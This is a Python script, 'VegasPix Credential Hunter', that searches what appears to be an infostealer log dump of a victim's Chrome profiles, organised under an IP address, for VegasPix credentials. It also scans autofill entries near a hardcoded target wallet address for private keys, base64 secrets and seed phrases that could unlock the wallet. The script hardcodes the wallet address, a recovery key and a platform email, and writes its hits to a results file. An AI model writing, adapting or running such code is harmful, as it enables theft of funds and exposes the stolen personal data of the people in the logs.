#!/usr/bin/env python3
"""
VegasPix Credential Hunter - Search for all VegasPix-related credentials that could unlock the wallet
"""

import os
import re
import json
from datetime import datetime

def hunt_vegaspix_credentials():
    print("🎯 VEGASPIX CREDENTIAL HUNTER")
    print("=" * 60)
    
    # Key information from our analysis
    target_address = "0x6e59e2a98d12f45ab5872942fe45a1036b1ea9c9"
    recovery_key = "8AKP9G3UJYWK4OYGFLRWEUBHZTA="
    vegaspix_email = "atendimentovegaspix@gmail.com"
    wallet_url = "https://vegaspix.bet/wallet"
    
    print(f"🎲 Target Platform: VegasPix.bet")
    print(f"📧 Platform Email: {vegaspix_email}")
    print(f"🏦 Wallet URL: {wallet_url}")
    print(f"🔑 Recovery Key: {recovery_key}")
    print(f"💰 Target Address: {target_address}")
    print("-" * 60)
    
    # Search for additional VegasPix credentials in multiple files
    search_paths = [
        "/home/admin/Downloads/net605/[BR]170.247.37.63/Chrome/Profile 1/",
        "/home/admin/Downloads/net605/[BR]170.247.37.63/Chrome/Default/",
        "/home/admin/Downloads/net605/[BR]170.247.37.63/"
    ]
    
    credentials = []
    
    # Search for password files and other credential sources
    for search_path in search_paths:
        if os.path.exists(search_path):
            print(f"\n🔍 SEARCHING: {search_path}")
            
            for root, dirs, files in os.walk(search_path):
                for file in files:
                    file_path = os.path.join(root, file)
                    
                    # Focus on credential-related files
                    if any(keyword in file.lower() for keyword in 
                          ['password', 'login', 'auth', 'credential', 'history', 'autofill']):
                        
                        print(f"   📄 Checking: {file}")
                        
                        try:
                            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                                content = f.read()
                                
                            # Look for VegasPix-related entries
                            if 'vegaspix' in content.lower():
                                print(f"   ✅ VegasPix content found!")
                                
                                # Extract context around VegasPix
                                lines = content.split('\n')
                                
                                for i, line in enumerate(lines):
                                    if 'vegaspix' in line.lower():
                                        # Extract surrounding context
                                        start = max(0, i-10)
                                        end = min(len(lines), i+10)
                                        
                                        context_lines = []
                                        for j in range(start, end):
                                            context_lines.append(f"Line {j+1:5d}: {lines[j].strip()}")
                                        
                                        credential_entry = {
                                            'file': file_path,
                                            'line_number': i+1,
                                            'matched_line': line.strip(),
                                            'context': context_lines
                                        }
                                        
                                        credentials.append(credential_entry)
                                        
                                        # Look for specific patterns in nearby lines
                                        for j in range(max(0, i-5), min(len(lines), i+5)):
                                            nearby_line = lines[j].strip().lower()
                                            
                                            # Look for login credentials
                                            if any(pattern in nearby_line for pattern in 
                                                  ['username', 'user', 'login', 'email', 'password', 
                                                   'pass', 'account', 'token', 'key']):
                                                
                                                print(f"      🎯 Potential credential (Line {j+1}): {lines[j].strip()}")
                        
                        except Exception as e:
                            print(f"   ❌ Error reading {file}: {e}")
    
    print(f"\n📊 VEGASPIX CREDENTIALS SUMMARY:")
    print(f"Found {len(credentials)} VegasPix-related entries")
    
    # Now let's search for specific patterns that could be wallet credentials
    print(f"\n🔐 SEARCHING FOR WALLET-SPECIFIC PATTERNS:")
    
    # Look in the main autofill file for more wallet patterns
    autofill_file = "/home/admin/Downloads/net605/[BR]170.247.37.63/Chrome/Profile 1/Autofills.txt"
    
    if os.path.exists(autofill_file):
        with open(autofill_file, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
        
        lines = content.split('\n')
        
        # Look for forms that might contain wallet credentials
        wallet_forms = []
        
        for i, line in enumerate(lines):
            if "FORM:" in line:
                form_name = line.strip()
                form_value = lines[i+1].strip() if i+1 < len(lines) else ""
                
                # Check for wallet-related form names
                form_lower = form_name.lower()
                
                if any(term in form_lower for term in 
                      ['wallet', 'private', 'seed', 'mnemonic', 'key', 'password', 
                       'login', 'account', 'auth', 'token', 'secret']):
                    
                    wallet_forms.append({
                        'line': i+1,
                        'form_name': form_name,
                        'form_value': form_value,
                        'distance_from_target': abs(i+1 - 5285)  # Distance from our target address line
                    })
        
        print(f"🏦 POTENTIAL WALLET FORMS: {len(wallet_forms)}")
        
        # Sort by distance from target address
        wallet_forms.sort(key=lambda x: x['distance_from_target'])
        
        for form in wallet_forms[:20]:  # Show top 20
            print(f"   Line {form['line']:5d} (distance: {form['distance_from_target']:3d}): {form['form_name']}")
            print(f"   Line {form['line']+1:5d}: {form['form_value']}")
            print()
        
        # Look for specific patterns that might be private keys or seeds
        print(f"🔍 SEARCHING FOR PRIVATE KEY PATTERNS NEAR TARGET:")
        
        # Check lines around our target address (5285) and recovery key (5357)
        target_ranges = [
            (5285 - 50, 5285 + 50),  # Around target address
            (5357 - 50, 5357 + 50)   # Around recovery key
        ]
        
        potential_keys = []
        
        for start_range, end_range in target_ranges:
            for i in range(max(0, start_range), min(len(lines), end_range)):
                line = lines[i].strip()
                
                if "VALUE:" in line:
                    value = line.replace("VALUE:", "").strip()
                    
                    # Check for hex patterns (private keys)
                    if re.match(r'^[0-9a-fA-F]{64}$', value):
                        potential_keys.append({
                            'type': 'hex_64',
                            'line': i+1,
                            'value': value,
                            'form': lines[i-1].strip() if i > 0 else ""
                        })
                    
                    # Check for base64 patterns
                    elif re.match(r'^[A-Za-z0-9+/]{32,}={0,2}$', value) and len(value) > 20:
                        potential_keys.append({
                            'type': 'base64',
                            'line': i+1,
                            'value': value,
                            'form': lines[i-1].strip() if i > 0 else ""
                        })
                    
                    # Check for seed phrase patterns
                    elif len(value.split()) >= 12 and all(word.isalpha() for word in value.split()):
                        potential_keys.append({
                            'type': 'seed_phrase',
                            'line': i+1,
                            'value': value,
                            'form': lines[i-1].strip() if i > 0 else ""
                        })
        
        print(f"🎯 POTENTIAL KEYS FOUND: {len(potential_keys)}")
        for key in potential_keys:
            print(f"   {key['type'].upper()} - Line {key['line']}: {key['form']}")
            print(f"   Value: {key['value'][:50]}{'...' if len(key['value']) > 50 else ''}")
            print()
    
    # Save comprehensive results
    results = {
        'timestamp': datetime.now().isoformat(),
        'target_address': target_address,
        'recovery_key': recovery_key,
        'vegaspix_email': vegaspix_email,
        'wallet_url': wallet_url,
        'credentials_found': len(credentials),
        'wallet_forms_found': len(wallet_forms) if 'wallet_forms' in locals() else 0,
        'potential_keys_found': len(potential_keys) if 'potential_keys' in locals() else 0,
        'credentials': credentials[:10],  # First 10 for brevity
        'wallet_forms': wallet_forms[:10] if 'wallet_forms' in locals() else [],
        'potential_keys': potential_keys if 'potential_keys' in locals() else []
    }
    
    with open('/home/admin/wallet_tool/vegaspix_credential_hunt_results.json', 'w') as f:
        json.dump(results, f, indent=2)
    
    print(f"\n💾 Results saved to: vegaspix_credential_hunt_results.json")
    
    return results

if __name__ == "__main__":
    hunt_vegaspix_credentials()
